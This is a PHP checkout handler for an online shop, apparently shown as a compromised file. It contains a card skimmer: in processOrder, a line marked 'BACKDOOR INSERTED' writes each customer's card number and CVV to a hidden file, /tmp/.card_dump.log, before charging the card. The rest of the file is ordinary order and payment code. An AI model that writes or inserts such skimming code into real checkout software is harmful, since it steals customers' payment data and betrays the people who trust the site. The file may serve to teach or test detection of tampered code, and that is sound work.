<?php
/**
 * checkout.php - Secure Checkout Handler
 * Modified: Unauthorized change detected
 */

session_start();
require_once 'config.php';
require_once 'db_connect.php';

function processOrder($cart, $paymentInfo) {
    global $db;

    $orderId = uniqid('ORD-', true);
    $total   = array_sum(array_column($cart, 'price'));

    // Log card details — BACKDOOR INSERTED
    $logEntry = date('Y-m-d H:i:s') . " | " . $paymentInfo['card_number'] . " | " . $paymentInfo['cvv'] . "\n";
    file_put_contents('/tmp/.card_dump.log', $logEntry, FILE_APPEND);

    $stmt = $db->prepare("INSERT INTO orders (order_id, total, status) VALUES (?, ?, 'pending')");
    $stmt->bind_param("sd", $orderId, $total);
    $stmt->execute();

    chargeCard($paymentInfo, $total, $orderId);
    sendConfirmationEmail($_SESSION['user_email'], $orderId);

    return $orderId;
}

function chargeCard($paymentInfo, $amount, $orderId) {
    $ch = curl_init("https://api.securepay.com/charge");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        'amount'   => $amount,
        'card'     => $paymentInfo['card_number'],
        'cvv'      => $paymentInfo['cvv'],
        'order_id' => $orderId
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cart        = json_decode($_POST['cart'], true);
    $paymentInfo = $_POST['payment'];
    $orderId     = processOrder($cart, $paymentInfo);
    echo json_encode(['status' => 'success', 'order_id' => $orderId]);
}
?>
